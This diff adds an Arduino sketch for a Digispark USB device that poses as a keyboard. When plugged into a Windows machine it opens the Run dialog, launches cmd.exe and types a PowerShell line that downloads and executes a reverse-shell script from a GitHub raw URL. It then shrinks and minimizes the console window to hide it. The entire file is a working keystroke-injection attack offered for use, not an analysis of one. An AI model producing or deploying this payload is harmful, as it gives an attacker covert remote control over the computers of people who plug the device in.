@@ -1,0 +1,34 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0); // Clear any previous input
+  DigiKeyboard.delay(1000); // Wait for system to recognize the device
+
+  // Open Run dialog
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+
+  // Open CMD
+  DigiKeyboard.println("cmd.exe");
+  DigiKeyboard.delay(200);
+
+  // Execute Powershell command for reverse shell
+  DigiKeyboard.println("cmd /C color FE&mode con:cols=18 lines=1&powershell \"iex(iwr raw.githubusercontent.com/Hug1n/reverse_shells/main/minrev.ps1)\"");
+  DigiKeyboard.delay(200);
+
+  // Minimize CMD window
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
+  DigiKeyboard.delay(100); // Slight delay to ensure the menu opens
+  for (int i = 0; i < 3; i++) {
+    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW); // Navigate down to "Minimize"
+    DigiKeyboard.delay(100); // Slight delay between keystrokes
+  }
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  while (true) {
+    DigiKeyboard.delay(10000); // Prevent re-execution
+  }
+}
+
